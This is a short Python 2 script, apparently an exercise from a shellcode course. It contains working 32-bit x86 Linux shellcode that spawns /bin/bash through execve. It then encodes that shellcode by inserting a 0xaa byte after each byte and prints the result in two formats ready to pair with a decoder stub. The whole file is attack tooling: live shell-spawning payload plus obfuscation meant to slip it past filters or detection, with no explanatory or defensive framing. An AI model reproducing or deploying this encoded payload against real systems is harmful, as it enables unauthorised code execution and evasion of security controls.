#!/bin/python

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded1 = ""
encoded2 = ""

for i in bytearray(shellcode):
    encoded1 += '\\x'
    encoded1 += '%02x' %i
    encoded1 += '\\xaa'
    
    encoded2 += '0x'
    encoded2 += '%02x, ' %i
    encoded2 += '0xaa, '

print "Format 1: {0}".format(encoded1)
print "Format 2: {0}".format(encoded2)
